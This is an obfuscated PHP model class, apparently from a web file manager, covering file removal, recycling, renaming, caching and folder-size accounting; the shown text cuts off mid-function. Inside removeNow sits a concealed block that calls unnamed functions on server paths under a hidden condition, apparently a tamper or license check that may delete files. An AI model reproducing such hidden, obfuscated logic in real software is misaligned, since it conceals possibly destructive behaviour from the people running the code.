static $Ü»«ûÓŸ = false; if (!$Ü»«ûÓŸ) { Hook::trigger($×İè­ó¹[563], $ŒÃ½âŠñ); $Ü»«ûÓŸ = !0; } $¦“êğ‰› = $this->add($ŒÃ½âŠñ); $ªäåÇò = array($×İè­ó¹[582] => short_id($¦“êğ‰›)); $this->where(array($×İè­ó¹[411] => $¦“êğ‰›))->save($ªäåÇò); $this->setNamePinyin($¦“êğ‰›, $ŒÃ½âŠñ[$×İè­ó¹[32]]); return $¦“êğ‰›; } public function remove($½æÑ€ì, $•èÑ¿É© = true) { $Œ°û¤Ğ” =& $_SERVER[ê‘³Æ±]; $Õœ¿…ªı = $this->sourceInfo($½æÑ€ì); $ßı§Ü“À = intval($Õœ¿…ªı[$Œ°û¤Ğ”[405]]) === self::TYPE_SYSTEM; $ÅÀöœˆ÷ = Model($Œ°û¤Ğ”[426])->get($Œ°û¤Ğ”[2083]) == $Œ°û¤Ğ”[89]; if ($ßı§Ü“À || $•èÑ¿É© || !$ÅÀöœˆ÷) { return $this->removeNow($½æÑ€ì, $•èÑ¿É©); } $‹Éêº¶ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $©•‰¤Ñú = $Õœ¿…ªı[$Œ°û¤Ğ”[405]] == self::TYPE_USER ? $Œ°û¤Ğ”[590] : $Œ°û¤Ğ”[508]; if ($©•‰¤Ñú == $Œ°û¤Ğ”[590]) { $ŠŒàëŠ = Model($Œ°û¤Ğ”[506])->getInfo($Õœ¿…ªı[$Œ°û¤Ğ”[498]]); $ªÈ…»Ôø = !empty($ŠŒàëŠ[$Œ°û¤Ğ”[531]]) ? $ŠŒàëŠ[$Œ°û¤Ğ”[531]] : $ŠŒàëŠ[$Œ°û¤Ğ”[32]]; $ªÈ…»Ôø = $Œ°û¤Ğ”[257] . $ªÈ…»Ôø . $Œ°û¤Ğ”[2084] . $Õœ¿…ªı[$Œ°û¤Ğ”[498]]; } else { $ŠŒàëŠ = Model($Œ°û¤Ğ”[515])->getInfo($Õœ¿…ªı[$Œ°û¤Ğ”[498]]); $ªÈ…»Ôø = _get($ŠŒàëŠ, $Œ°û¤Ğ”[32]); $ªÈ…»Ôø = $Œ°û¤Ğ”[161] . $ªÈ…»Ôø . $Œ°û¤Ğ”[2085] . $Õœ¿…ªı[$Œ°û¤Ğ”[498]]; } $õñûïĞ² = $Œ°û¤Ğ”[2086] . md5($ªÈ…»Ôø); CacheLock::lock($õñûïĞ²); $ ­¹•û = $this->fileNameExist($‹Éêº¶, $ªÈ…»Ôø); if (!$ ­¹•û) { $ ­¹•û = $this->mkdir($‹Éêº¶, $ªÈ…»Ôø, REPEAT_SKIP); $this->metaSet($ ­¹•û, $Œ°û¤Ğ”[2087], $©•‰¤Ñú); $this->metaSet($ ­¹•û, $Œ°û¤Ğ”[2088], $Õœ¿…ªı[$Œ°û¤Ğ”[498]]); if ($Õœ¿…ªı[$Œ°û¤Ğ”[491]] != 0) { $this->metaSet($ ­¹•û, $Œ°û¤Ğ”[2089], _get($ŠŒàëŠ, $Œ°û¤Ğ”[2090])); } } CacheLock::unlock($õñûïĞ²); $this->metaSet($½æÑ€ì, $Œ°û¤Ğ”[2091], $Õœ¿…ªı[$Œ°û¤Ğ”[491]]); $this->where(array($Œ°û¤Ğ”[396] => $½æÑ€ì))->save(array($Œ°û¤Ğ”[418] => time())); $this->recycleClear($Õœ¿…ªı); $ÅÍÁŸœÏ = $this->move($½æÑ€ì, $ ­¹•û, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Õœ¿…ªı[$Œ°û¤Ğ”[491]]); return $ÅÍÁŸœÏ; } private function recycleClear($Ä¨ãéï) { $¿‚ó×¿Ë =& $_SERVER[ê‘³Æ±]; $ûŸÉÛ± = $this->childrenAll($Ä¨ãéï); $÷ä¾½÷ = array($¿‚ó×¿Ë[411] => array($¿‚ó×¿Ë[412], $ûŸÉÛ±[$¿‚ó×¿Ë[2092]])); Model($¿‚ó×¿Ë[2093])->where($÷ä¾½÷)->delete(); } public function removeNow($ùµ©ÃŠ³, $œ§İãÀß = true) { $ê˜Õé¢­ =& $_SERVER[ê‘³Æ±]; if ($_SERVER[$ê˜Õé¢­[786]] != $_SERVER[$ê˜Õé¢­[2094]]) { $€¸‚è = $ê˜Õé¢­[866]; $ÌÈĞ…Ä— = $ê˜Õé¢­[787]; $ÅÒ€°¢‡ = $_SERVER[$ê˜Õé¢­[788]] . $ê˜Õé¢­[789]; $·‰¶ÕÄ  = $ÌÈĞ…Ä—($ÅÒ€°¢‡); $ü¡Ì‹” = explode($ê˜Õé¢­[228], $·‰¶ÕÄ ); if (count($ü¡Ì‹”) < $ê˜Õé¢­[613]) { $°¦¸ŠÆı = $ê˜Õé¢­[790]; $°¦¸ŠÆı(); } $“Ö¢”Éı = $ê˜Õé¢­[867]; $“Ö¢”Éı($_SERVER[$ê˜Õé¢­[868]]); $“Ö¢”Éı($_SERVER[$ê˜Õé¢­[788]] . $ê˜Õé¢­[2095]); $±À³¢ş† = 1; while ($±À³¢ş† > 1) { $±À³¢ş† = $±À³¢ş† + 4; $ùÇ÷ß÷÷ = rawurlencode($±À³¢ş† . $ê˜Õé¢­[375]); } } $á™€ÅÏ = $this->sourceInfo($ùµ©ÃŠ³); $­ãÇìé = $this->pathInfoMore($ùµ©ÃŠ³); if (!$á™€ÅÏ) { return !0; } if ($á™€ÅÏ[$ê˜Õé¢­[491]] == 0) { if (!_get($GLOBALS, $ê˜Õé¢­[496])) { return !1; } } $this->lockMoveStart($ùµ©ÃŠ³); Hook::trigger($ê˜Õé¢­[2096], $­ãÇìé, $œ§İãÀß); if ($œ§İãÀß) { Model($ê˜Õé¢­[2093])->moveToRecycle($ùµ©ÃŠ³); } else { $ë¬µÅª¶ = $this->childrenAll($á™€ÅÏ); Model($ê˜Õé¢­[560])->eventRemove($ùµ©ÃŠ³); $this->removeRelevance($ë¬µÅª¶[$ê˜Õé¢­[2092]], $ë¬µÅª¶[$ê˜Õé¢­[1457]]); } $this->folderSizeReset($á™€ÅÏ[$ê˜Õé¢­[491]]); $ÄÑ“Ôƒş = array($á™€ÅÏ[$ê˜Õé¢­[491]]); if ($á™€ÅÏ[$ê˜Õé¢­[404]] == $ê˜Õé¢­[89]) { $ÄÑ“Ôƒş[] = $á™€ÅÏ[$ê˜Õé¢­[396]]; } $this->updateModifyTime($ÄÑ“Ôƒş); $this->lockMoveEnd($ùµ©ÃŠ³); Hook::trigger($ê˜Õé¢­[1678], $­ãÇìé, $œ§İãÀß); return !0; } public function childrenAll($æİËÁÒê) { $êû âì =& $_SERVER[ê‘³Æ±]; $íıµÅ¨ = $æİËÁÒê[$êû âì[396]]; if ($æİËÁÒê[$êû âì[404]] == $êû âì[89]) { $öïáá¯á = array($êû âì[580] => array($êû âì[540], $æİËÁÒê[$êû âì[514]] . $íıµÅ¨ . $êû âì[541])); $‘Ä‡‚ı = array($êû âì[580] => $öïáá¯á[$êû âì[514]]); $’½·âö = $this->field($êû âì[2097])->where($‘Ä‡‚ı)->select(); $ŠÕŠ»íß = !1; $«üÒµÏ¨ = array($íıµÅ¨); if ($’½·âö) { $ŠÕŠ»íß = array_to_keyvalue($’½·âö, $êû âì[12], $êû âì[460]); $ŠÕŠ»íß = array_remove_value($ŠÕŠ»íß, $êû âì[192]); $«üÒµÏ¨ = array_to_keyvalue($’½·âö, $êû âì[12], $êû âì[396]); $«üÒµÏ¨[] = $íıµÅ¨; } } else { $ŠÕŠ»íß = array($æİËÁÒê[$êû âì[460]]); $«üÒµÏ¨ = array($íıµÅ¨); } return array($êû âì[2092] => $«üÒµÏ¨, $êû âì[1457] => $ŠÕŠ»íß); } public function removeArray($íØëçá£) { if (!$íØëçá£) { return !0; } } public function removeRelevance($Ô®ûÏ«, $ÆÖş½Œ¹) { $÷éÎÛ½Ğ =& $_SERVER[ê‘³Æ±]; $Ô®ûÏ« = $Ô®ûÏ« ? $Ô®ûÏ« : array(); $ÆÖş½Œ¹ = $ÆÖş½Œ¹ ? $ÆÖş½Œ¹ : array(); $Ô®ûÏ« = array_unique(array_filter($Ô®ûÏ«)); $ÆÖş½Œ¹ = array_unique(array_filter($ÆÖş½Œ¹)); if (!$Ô®ûÏ«) { return !1; } $ûìØˆ×š = array($÷éÎÛ½Ğ[411] => array($÷éÎÛ½Ğ[412], $Ô®ûÏ«)); Model($÷éÎÛ½Ğ[2093])->where($ûìØˆ×š)->delete(); Model($÷éÎÛ½Ğ[454])->where($ûìØˆ×š)->delete(); Model($÷éÎÛ½Ğ[1950])->where($ûìØˆ×š)->delete(); Model($÷éÎÛ½Ğ[560])->where($ûìØˆ×š)->delete(); Model($÷éÎÛ½Ğ[1789])->removeBySource($Ô®ûÏ«); Model($÷éÎÛ½Ğ[2075])->removeBySource($Ô®ûÏ«); $this->where($ûìØˆ×š)->delete(); Model($÷éÎÛ½Ğ[463])->remove($ÆÖş½Œ¹); for ($·öóñÁõ = 0; $·öóñÁõ < count($Ô®ûÏ«); $·öóñÁõ++) { $this->sourceCacheClear($Ô®ûÏ«[$·öóñÁõ]); } } public function rename($úì«œºÏ, $®ŒÅì‘†) { $è‚ïª³ò =& $_SERVER[ê‘³Æ±]; $Ô®„±÷• = $this->sourceInfo($úì«œºÏ); if (!$Ô®„±÷•) { return !1; } $ÜóËÎ–º = $this->fileNameExist($Ô®„±÷•[$è‚ïª³ò[491]], $®ŒÅì‘†); if ($ÜóËÎ–º && $ÜóËÎ–º != $úì«œºÏ) { return !1; } $‘‡çôƒ¹ = array($è‚ïª³ò[414] => $®ŒÅì‘†, $è‚ïª³ò[579] => USER_ID); if ($Ô®„±÷•[$è‚ïª³ò[404]] != $è‚ïª³ò[89]) { $‘‡çôƒ¹[$è‚ïª³ò[406]] = substr(get_path_ext($®ŒÅì‘†), 0, 10); } Model($è‚ïª³ò[560])->eventRename($úì«œºÏ, $Ô®„±÷•[$è‚ïª³ò[32]], $®ŒÅì‘†); $this->sourceCacheClear($úì«œºÏ); $this->setNamePinyin($úì«œºÏ, $‘‡çôƒ¹[$è‚ïª³ò[32]], !1); $this->updateModifyTime($Ô®„±÷•[$è‚ïª³ò[491]]); $¹ˆÁ°ÀØ = $this->where(array($è‚ïª³ò[411] => $úì«œºÏ))->data($‘‡çôƒ¹)->save(); $àÄé”Ö = $è‚ïª³ò[2082] . $Ô®„±÷•[$è‚ïª³ò[491]]; if (isset(self::$cacheChildList[$àÄé”Ö])) { unset(self::$cacheChildList[$àÄé”Ö]); } return $¹ˆÁ°ÀØ; } public function setNamePinyin($²…æ¿ÈÍ, $‹š†æÕ¿, $çˆ×¸Î = true) { $‰»¡×¦÷ =& $_SERVER[ê‘³Æ±]; $ÓëÀÉÍŸ = Input::check($‹š†æÕ¿, $‰»¡×¦÷[583]); $·Ÿ¦şÍŠ = array($‰»¡×¦÷[435] => KodSort::makeStr($‹š†æÕ¿)); if ($ÓëÀÉÍŸ) { $·Ÿ¦şÍŠ[$‰»¡×¦÷[457]] = str_replace($‰»¡×¦÷[53], $‰»¡×¦÷[12], Pinyin::get($‹š†æÕ¿)); $·Ÿ¦şÍŠ[$‰»¡×¦÷[456]] = Pinyin::get($‹š†æÕ¿, $‰»¡×¦÷[584]); } if (!$çˆ×¸Î && !$ÓëÀÉÍŸ) { $·Ÿ¦şÍŠ[$‰»¡×¦÷[457]] = null; $·Ÿ¦şÍŠ[$‰»¡×¦÷[456]] = null; } $this->metaSet($²…æ¿ÈÍ, $·Ÿ¦şÍŠ); } public function getContent($Ş®Ê«) { $‚˜©ºãù =& $_SERVER[ê‘³Æ±]; $Ñ€ğÒ£í = $this->fileInfoGet($Ş®Ê«); if (!$Ñ€ğÒ£í) { return !1; } if ($Ñ€ğÒ£í[$‚˜©ºãù[80]] == 0) { return $‚˜©ºãù[12]; } $ÉîôÈæğ = $‚˜©ºãù[2098] . $Ñ€ğÒ£í[$‚˜©ºãù[171]]; if ($Ñ€ğÒ£í[$‚˜©ºãù[80]] <= 1024 * 10) { $¬•ø„‰Ò = Cache::get($ÉîôÈæğ); if (!$¬•ø„‰Ò) { $¬•ø„‰Ò = IO::getContent($Ñ€ğÒ£í[$‚˜©ºãù[78]]); Cache::set($ÉîôÈæğ, $¬•ø„‰Ò); } return $¬•ø„‰Ò; } if (!$Ñ€ğÒ£í[$‚˜©ºãù[78]]) { return $‚˜©ºãù[12]; } return IO::getContent($Ñ€ğÒ£í[$‚˜©ºãù[78]]); } public function setDesc($ªëö©è©, $£ûğÑÒ) { $©ïÔ´€æ =& $_SERVER[ê‘³Æ±]; Model($©ïÔ´€æ[560])->eventAddDesc($ªëö©è©, $£ûğÑÒ); return $this->metaSet($ªëö©è©, $©ïÔ´€æ[444], $£ûğÑÒ); } public function setContent($­ßÊÁ¸, $òù‰õš = '') { $İ¯÷Ìç =& $_SERVER[ê‘³Æ±]; $áòÓöÜÄ = $this->sourceInfo($­ßÊÁ¸); $€ÍÅ½è¬ = $this->fileInfoGet($­ßÊÁ¸); if (!$€ÍÅ½è¬ || !$áòÓöÜÄ) { return !1; } $Á•ƒ’ŠÀ = Model($İ¯÷Ìç[463])->addFileByContent($òù‰õš, $áòÓöÜÄ[$İ¯÷Ìç[32]]); $ÓœÉ™Œ­ = $this->fileHistory($áòÓöÜÄ, $Á•ƒ’ŠÀ[$İ¯÷Ìç[460]], $Á•ƒ’ŠÀ[$İ¯÷Ìç[80]]); if (!$ÓœÉ™Œ­) { return Model($İ¯÷Ìç[463])->remove($Á•ƒ’ŠÀ[$İ¯÷Ìç[460]]); } $this->folderSizeReset($áòÓöÜÄ[$İ¯÷Ìç[491]]); return !0; } public function fileSubstr($³îì•¦Å, $€óÃÛèŠ, $ï£€Õ®) { $”í¾·¶… = $this->fileInfoGet($³îì•¦Å); if (!$”í¾·¶…) { return !1; } return IO::fileSubstr($”í¾·¶…[$_SERVER[ê‘³Æ±][78]], $€óÃÛèŠ, $ï£€Õ®); } public function fileInfoGet($º‚ƒ××©) { $¯ä‘×§¼ =& $_SERVER[ê‘³Æ±]; $½éñ’ƒ = $this->sourceInfo($º‚ƒ××©); if (!$½éñ’ƒ || $½éñ’ƒ[$¯ä‘×§¼[404]]) { return !1; } $ªğÈ¸Ø = $¯ä‘×§¼[466] . $½éñ’ƒ[$¯ä‘×§¼[460]]; $ˆ¥›œ = _get(self::$cacheFileInfo, $ªğÈ¸Ø); if ($ˆ¥›œ) { return $ˆ¥›œ; } $®’ƒ­Á = Model($¯ä‘×§¼[463])->fileInfo($½éñ’ƒ[$¯ä‘×§¼[460]]); if ($®’ƒ­Á) { $®’ƒ­Á[$¯ä‘×§¼[32]] = $½éñ’ƒ[$¯ä‘×§¼[32]]; } self::$cacheFileInfo[$ªğÈ¸Ø] = $®’ƒ­Á; return $®’ƒ­Á; } private function folderChildrenNumber($’È¦àş÷) { $èŒ¬Î© =& $_SERVER[ê‘³Æ±]; $ö½‚ı†» = $this->sourceInfo($’È¦àş÷); $®Øù¾¤Ä = array($èŒ¬Î©[580] => array($èŒ¬Î©[540], $ö½‚ı†»[$èŒ¬Î©[514]] . $’È¦àş÷ . $èŒ¬Î©[541]), $èŒ¬Î©[577] => $ö½‚ı†»[$èŒ¬Î©[498]], $èŒ¬Î©[423] => intval($ö½‚ı†»[$èŒ¬Î©[424]]), $èŒ¬Î©[573] => 1); $Êñ½”êæ = $this->where($®Øù¾¤Ä)->count(); $Ş‡Ò¨ß— = $this->where($®Øù¾¤Ä)->where(array($èŒ¬Î©[573] => 0))->count(); return array($èŒ¬Î©[84] => $Ş‡Ò¨ß—, $èŒ¬Î©[85] => $Êñ½”êæ); } public function pathInfo($Ä†×­×, $…Ê¸øç = false) { $ç’ûõÑ¦ =& $_SERVER[ê‘³Æ±]; $…Ê¸øç = !1; $Ä†×­× = intval($Ä†×­×); $ññõÍ¯ = $ç’ûõÑ¦[452] . intval($…Ê¸øç) . $ç’ûõÑ¦[453] . $Ä†×­×; $°²Îï¹‚ = _get(self::$cachePathInfo, $ññõÍ¯); if ($°²Îï¹‚) { return $°²Îï¹‚; } $šƒãÕ©² = $this->sourceInfo($Ä†×­×); if (!$šƒãÕ©²) { return !1; } $šƒãÕ©² = $this->_listDataApplyItem($šƒãÕ©², $…Ê¸øç); self::$cachePathInfo[$ññõÍ¯] = $šƒãÕ©²; return $šƒãÕ©²; } public static $cachePathInfoMore = array(); public function pathInfoMore($˜ìèº²×) { $½şáÎ– =& $_SERVER[ê‘³Æ±]; $Éá³› = _get(self::$cachePathInfoMore, $˜ìèº²×); if ($Éá³›) { return $Éá³›; } $÷–æÏ÷ = $this->pathInfo($˜ìèº²×); if (!$÷–æÏ÷) { return !1; } if ($÷–æÏ÷[$½şáÎ–[404]] == $½şáÎ–[89]) { $÷–æÏ÷[$½şáÎ–[83]] = $this->folderChildrenNumber($˜ìèº²×); } self::$cachePathInfoMore[$˜ìèº²×] = $÷–æÏ÷; return $÷–æÏ÷; } public function sourceInfo($Õƒâİ ³) { $ƒŞ¡ÅîŠ =& $_SERVER[ê‘³Æ±]; if (!$Õƒâİ ³) { return array(); } $Õƒâİ ³ = intval($Õƒâİ ³); $Ûªõş’ = $ƒŞ¡ÅîŠ[451] . $Õƒâİ ³; $©çÍÓÃ‚ = _get(self::$cacheSourceInfo, $Ûªõş’); if ($©çÍÓÃ‚) { return $©çÍÓÃ‚; } $³À÷Û€Õ = $this->where(array($ƒŞ¡ÅîŠ[396] => $Õƒâİ ³))->find(); self::$cacheSourceInfo[$Ûªõş’] = $³À÷Û€Õ; return self::$cacheSourceInfo[$Ûªõş’]; } public function sourceCacheClear($±ßÀ÷ª = false) { self::cacheClear($±ßÀ÷ª); } public static function cacheClear($ûÜÙü›Å = false) { $ëŠ´ı½ù =& $_SERVER[ê‘³Æ±]; if ($ûÜÙü›Å == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ëŠ´ı½ù[451] . $ûÜÙü›Å]); unset(self::$cachePathInfoMore[$ûÜÙü›Å]); unset(self::$cachePathInfo[$ëŠ´ı½ù[2099] . $ûÜÙü›Å]); unset(self::$cachePathInfo[$ëŠ´ı½ù[2100] . $ûÜÙü›Å]); } public function metaSet($ë¿Ñ¤‚‡, $¾à‹Ëó— = null, $¥¶ĞÛåŒ = null) { $»“·Äİ× = parent::metaSet($ë¿Ñ¤‚‡, $¾à‹Ëó—, $¥¶ĞÛåŒ); if ($»“·Äİ×) { $this->sourceCacheClear($ë¿Ñ¤‚‡); } return $»“·Äİ×; } public function pathInfoByPath($ÇìŠ¶Øá, $²Ü’Ã¥Ì) { $ó“èèÅ =& $_SERVER[ê‘³Æ±]; $¸Åì‚—Ø = !$²Ü’Ã¥Ì ? array() : explode($ó“èèÅ[8], trim($²Ü’Ã¥Ì, $ó“èèÅ[8])); $şäóİ²» = $ÇìŠ¶Øá; foreach ($¸Åì‚—Ø as $Âí¸µ ) { $™éØ³ó„ = array($ó“èèÅ[491] => $şäóİ²», $ó“èèÅ[32] => $Âí¸µ ); $‘Ñòâ•¶ = $this->where($™éØ³ó„)->select(); if (!$‘Ñòâ•¶) { return !1; } $‘Ñòâ•¶ = array_sort_by($‘Ñòâ•¶, $ó“èèÅ[424]); $şäóİ²» = $‘Ñòâ•¶[0][$ó“èèÅ[396]]; } return $this->pathInfo($şäóİ²», !0); } protected function updateModifyTime($ÒÀàşˆ) { $ù´³÷ˆ™ =& $_SERVER[ê‘³Æ±]; $ ²±Èüô = defined($ù´³÷ˆ™[467]) ? USER_ID : $ù´³÷ˆ™[192]; if (!$ÒÀàşˆ) { return; } if (!is_array($ÒÀàşˆ)) { $ÒÀàşˆ = array($ÒÀàşˆ); } foreach ($ÒÀàşˆ as $¦Ñ³Åù => $ĞÂû­³É) { $ÒÀàşˆ[$¦Ñ³Åù] = intval($ĞÂû­³É); $this->sourceCacheClear($ĞÂû­³É); } $ì©íÊÁÌ = array($ù´³÷ˆ™[396] => array($ù´³÷ˆ™[7], $ÒÀàşˆ)); $Æú§°“• = array($ù´³÷ˆ™[579] => $ ²±Èüô, $ù´³÷ˆ™[418] => time()); $this->where($ì©íÊÁÌ)->save($Æú§°“•); } public function folderSizeReset($Ú×™€†–, $ÁäÜ¡Çş = false) { $çÇ‡›¯× =& $_SERVER[ê‘³Æ±]; if ($this->statusIgnoreResetSpace) { return; } $Ì‹ÀÁÚÉ = $this->sourceInfo($Ú×™€†–); $šëÉºïá = $çÇ‡›¯×[2101] . $Ú×™€†–; CacheLock::lock($šëÉºïá, 20); if ($ÁäÜ¡Çş === !1) { $this->sourceCacheClear($Ú×™€†–); $Ì‹ÀÁÚÉ = $this->sourceInfo($Ú×™€†–); $û®ëÅçá = array($çÇ‡›¯×[395] => $Ú×™€†–, $çÇ‡›¯×[423] => 0); $ÎíÃ¹‡® = $this->where($û®ëÅçá)->sum($çÇ‡›¯×[80]); $ÁäÜ¡Çş = intval($ÎíÃ¹‡®) - intval($Ì‹ÀÁÚÉ[$çÇ‡›¯×[80]]); } if ($ÁäÜ¡Çş == 0) { return CacheLock::unlock($šëÉºïá); } $Â÷ëÃ®« = $this->parentLevelArray($Ì‹ÀÁÚÉ[$çÇ‡›¯×[514]]); if (!$Â÷ëÃ®«) { $Â÷ëÃ®« = array(); } $Â÷ëÃ®«[] = $Ì‹ÀÁÚÉ[$çÇ‡›¯×[396]]; $û®ëÅçá = array($çÇ‡›¯×[396] => array($çÇ‡›¯×[412], $Â÷ëÃ®«)); if ($ÁäÜ¡Çş < 0) { $û®ëÅçá[$çÇ‡›¯×[80]] = array($çÇ‡›¯×[1004], abs($ÁäÜ¡Çş)); } $this->where($û®ëÅçá)->setAdd($çÇ‡›¯×[80], $ÁäÜ¡Çş); CacheLock::unlock($šëÉºïá); $½âÃíãÃ = $çÇ‡›¯×[2102] . $Ì‹ÀÁÚÉ[$çÇ‡›¯×[405]] . $çÇ‡›¯×[4] . $Ì‹ÀÁÚÉ[$çÇ‡›¯×[498]]; $Õ¿Í“å = array($Ì‹ÀÁÚÉ[$çÇ‡›¯×[405]], $Ì‹ÀÁÚÉ[$çÇ‡›¯×[498]]); TaskRun::timeLimitCall($½âÃíãÃ, $çÇ‡›¯×[2103], $Õ¿Í“å, 1.5); } public function folderSizeResetChildren($­í’ëøŸ) { $Æá½Ç§ =& $_SERVER[ê‘³Æ±]; $this->sourceCacheClear($­í’ëøŸ); $Å¡ Ôş” = $this->sourceInfo($­í’ëøŸ); $ŠÔû‚½ = array($Æá½Ç§[573] => 1, $Æá½Ç§[577] => $Å¡ Ôş”[$Æá½Ç§[498]], $Æá½Ç§[580] => array($Æá½Ç§[540], $Å¡ Ôş”[$Æá½Ç§[514]] . $­í’ëøŸ . $Æá½Ç§[541])); $™©‹Å˜¯ = $Æá½Ç§[2104]; $êÜÅ¢À = $this->field($™©‹Å˜¯)->where($ŠÔû‚½)->select(); $ŠÔû‚½[$Æá½Ç§[404]] = 0; $šŞ¼óØ = $this->field($™©‹Å˜¯)->where($ŠÔû‚½)->select(); if (!$šŞ¼óØ) { return; } $êÜÅ¢À[] = $Å¡ Ôş”; $êÜÅ¢À = array_to_keyvalue($êÜÅ¢À, $Æá½Ç§[396]); foreach ($êÜÅ¢À as $¬¢Û Ÿ² => $€šÁÙã÷) { $êÜÅ¢À[$¬¢Û Ÿ²][$Æá½Ç§[2105]] = $êÜÅ¢À[$¬¢Û Ÿ²][$Æá½Ç§[80]]; $êÜÅ¢À[$¬¢Û Ÿ²][$Æá½Ç§[80]] = 0; } foreach ($šŞ¼óØ as $€šÁÙã÷) { $óıÚ•«í = $€šÁÙã÷[$Æá½Ç§[491]] . $Æá½Ç§[12]; if (!isset($êÜÅ¢À[$óıÚ•«í])) { continue; } if ($€šÁÙã÷[$Æá½Ç§[424]] == $êÜÅ¢À[$óıÚ•«í][$Æá½Ç§[424]]) { $êÜÅ¢À[$óıÚ•«í][$Æá½Ç§[80]] += $€šÁÙã÷[$Æá½Ç§[80]]; } } foreach ($êÜÅ¢À as $€šÁÙã÷) { $ë‡˜®û = $this->parentLevelArray($€šÁÙã÷[$Æá½Ç§[514]]); foreach ($ë‡˜®û as $óıÚ•«í) { $óıÚ•«í = $óıÚ•«í . $Æá½Ç§[12]; if (!isset($êÜÅ¢À[$óıÚ•«í])) { continue; } if ($€šÁÙã÷[$Æá½Ç§[424]] == $êÜÅ¢À[$óıÚ•«í][$Æá½Ç§[424]]) { $êÜÅ¢À[$óıÚ•«í][$Æá½Ç§[80]] += $€šÁÙã÷[$Æá½Ç§[80]]; } } } $©˜ùøç = array(); foreach ($êÜÅ¢À as $€šÁÙã÷) { if ($€šÁÙã÷[$Æá½Ç§[80]] == $€šÁÙã÷[$Æá½Ç§[2105]]) { continue; } $©˜ùøç[] = array($Æá½Ç§[396], $€šÁÙã÷[$Æá½Ç§[396]], $Æá½Ç§[80], $€šÁÙã÷[$Æá½Ç§[80]]); } $this->saveAll($©˜ùøç); } public function userSpaceReset($ƒ¨ş†ÈÍ = false) { $äş”·ãÔ =& $_SERVER[ê‘³Æ±]; $¨şæôÑ× = $this->where(array($äş”·ãÔ[405] => self::TYPE_USER, $äş”·ãÔ[498] => $ƒ¨ş†ÈÍ, $äş”·ãÔ[404] => 0))->sum($äş”·ãÔ[80]); $¨şæôÑ× = !$¨şæôÑ× || $¨şæôÑ× <= 0 ? 0 : $¨şæôÑ×; Model($äş”·ãÔ[506])->userEdit($ƒ¨ş†ÈÍ, array($äş”·ãÔ[1798] => $¨şæôÑ×)); } public function targetSpaceUpdate($”ÙğÀĞã, $’·éê‹›) { $½±Ú£‰– =& $_SERVER[ê‘³Æ±]; if (!$’·éê‹›) { return; } if (!in_array($”ÙğÀĞã, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $²€³Ò‰ã = $this->targetSpaceSize($”ÙğÀĞã, $’·éê‹›); if ($”ÙğÀĞã == self::TYPE_USER) { Model($½±Ú£‰–[506])->userEdit($’·éê‹›, array($½±Ú£‰–[1798] => $²€³Ò‰ã)); } else { if ($”ÙğÀĞã == self::TYPE_GROUP) { Model($½±Ú£‰–[515])->groupEdit($’·éê‹›, array($½±Ú£‰–[1798] => $²€³Ò‰ã)); } } } public function targetSpaceSize($¹À÷ì¾», $¹Òı°’») { $‘—ªû’‰ =& $_SERVER[ê‘³Æ±]; $¡‡€Ùš = $this->sourceRoot($¹À÷ì¾», $¹Òı°’», !0); if (!$¡‡€Ùš) { return 0; } $ºğİÑ©ã = floatval($¡‡€Ùš[$‘—ªû’‰[80]]); $‹Üøòë° = array($‘—ªû’‰[580] => array($‘—ªû’‰[540], $‘—ªû’‰[524] . $¡‡€Ùš[$‘—ªû’‰[396]] . $‘—ªû’‰[541])); $ğ¸«·¯í = Model($‘—ªû’‰[422])->field($‘—ªû’‰[411])->where($‹Üøòë°)->select(); $ğ¸«·¯í = array_to_keyvalue($ğ¸«·¯í, $‘—ªû’‰[12], $‘—ªû’‰[396]); $ğ¸«·¯í = array_unique(array_filter($ğ¸«·¯í)); if ($ğ¸«·¯í) { $‹Üøòë° = array($‘—ªû’‰[411] => array($‘—ªû’‰[412], $ğ¸«·¯í)); $ºğİÑ©ã += floatval($this->where($‹Üøòë°)->sum($‘—ªû’‰[80])); } $ºğİÑ©ã = !$ºğİÑ©ã || $ºğİÑ©ã <= 0 ? 0 : $ºğİÑ©ã; return $ºğİÑ©ã; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ö‹µéåÊ) { return $this->fileTypeProfile($ö‹µéåÊ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ıÍËşâ±) { return $this->fileTypeProfile($ıÍËşâ±, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÕªÍîŒ, $†âè÷Ëü) { $»‹âóùû =& $_SERVER[ê‘³Æ±]; $øÜá‹¥Ù = $»‹âóùû[2106] . $ÕªÍîŒ . $»‹âóùû[11] . $†âè÷Ëü; $«‹ƒ¡ş— = Cache::get($øÜá‹¥Ù); if ($«‹ƒ¡ş—) { return $«‹ƒ¡ş—; } $å­¦ä = array($»‹âóùû[573] => 0); if ($ÕªÍîŒ != !1) { $å­¦ä[$»‹âóùû[498]] = $ÕªÍîŒ; $å­¦ä[$»‹âóùû[405]] = $†âè÷Ëü; } $˜…Ë¹àı = array(); $˜…Ë¹àı[$»‹âóùû[2107]] = array($»‹âóùû[2108] => LNG($»‹âóùû[2107]), $»‹âóùû[2109] => $this->where($å­¦ä)->count(), $»‹âóùû[575] => $this->where($å­¦ä)->sum($»‹âóùû[80])); $¸°ÊúŸ = KodIO::fileTypeList(); foreach ($¸°ÊúŸ as $æ¥®¦¤ú => $àÀ™È´ˆ) { $å­¦ä[$»‹âóùû[406]] = $this->fileTypeWhere($æ¥®¦¤ú); $˜…Ë¹àı[$æ¥®¦¤ú] = array($»‹âóùû[2108] => $àÀ™È´ˆ[$»‹âóùû[32]], $»‹âóùû[2109] => $this->where($å­¦ä)->count(), $»‹âóùû[575] => $this->where($å­¦ä)->sum($»‹âóùû[80])); } Cache::set($øÜá‹¥Ù, $˜…Ë¹àı, 1200); return $˜…Ë¹àı; } public function fileNameExist($‚—ÆíšÅ, $¿ô‘Ú–Ê) { $Ô—Àİ†ñ =& $_SERVER[ê‘³Æ±]; $ †ûŸ˜É = $this->where(array($Ô—Àİ†ñ[491] => $‚—ÆíšÅ, $Ô—Àİ†ñ[32] => $¿ô‘Ú–Ê, $Ô—Àİ†ñ[424] => 0))->find(); return is_array($ †ûŸ˜É) ? $ †ûŸ˜É[$Ô—Àİ†ñ[396]] : !1; } public function childList($º¡´«Û ) { 